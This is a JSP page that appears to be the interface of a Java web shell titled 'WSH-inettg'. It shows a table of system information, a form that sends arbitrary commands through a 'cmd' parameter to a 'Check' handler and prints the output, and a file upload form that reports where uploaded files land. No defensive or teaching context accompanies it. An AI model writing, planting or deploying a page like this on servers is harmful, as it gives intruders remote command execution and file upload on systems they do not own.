<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%@  taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<!DOCTYPE html>


<html>
<head>
<meta charset="UTF-8">
<link rel="stylesheet" href="css/style.css">
<title>WSH-inettg</title>
</head>
<body>
	<table id="infoTable">
		<thead>
			<tr>
				<th colspan="2">System info</th>
			</tr>
		</thead>
		<tbody>
			<c:forEach items="${info}" var="command">
				<tr>
					<td><c:out value="${command.name}"></c:out></td>
					<td><c:out value="${command.result}"></c:out></td>
				</tr>
			</c:forEach>
		</tbody>
	</table>

	<br>
	<br>

	<FORM METHOD=GET ACTION='Check'>
		<INPUT name='cmd' type=text> <INPUT type=submit value='Run'>
	</FORM>
	<pre>
		<c:out value="${cmd}"></c:out>
	</pre>

	<h3>Upload</h3>
	<form action="Upload" method="post" enctype="multipart/form-data">
		<input type="file" name="file" /> <br> <input type="submit"
			value="Upload" />
	</form>
	<pre>
		<c:if test="${url!=null}">
			<c:out value="File uploaded here: ${url}"></c:out>
		</c:if>
		
	</pre>




</body>
</html>